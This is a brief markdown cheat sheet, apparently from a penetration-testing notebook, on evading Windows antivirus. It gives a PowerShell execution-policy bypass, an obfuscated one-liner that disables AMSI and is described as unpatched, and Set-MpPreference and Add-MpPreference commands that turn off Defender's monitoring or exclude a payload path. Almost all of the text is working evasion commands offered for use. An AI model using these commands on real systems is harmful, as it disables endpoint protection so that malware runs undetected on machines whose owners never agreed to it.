# Antivirus Bypass & Evasion Techniques

## Bypassing AMSI and Disable Execution Policy

- `PS C:\> powershell -ep bypass`
- So now that we have bypassed PowerShell’s execution policy, we need to disable AMSI. Below is a good bypass for AMSI that hasn’t been patched by Microsoft yet. Type this into the PowerShell console to bypass AMSI. There are several others out there, but this is my go-to.
- `sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )`


### Disable AV if and only if you are admin

#### disable
`powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'`

#### Or exclude
`powershell -command 'Add-MpPreference -ExclusionPath "c:\temp" -ExclusionProcess "c:\temp\yourstuffs.exe"'`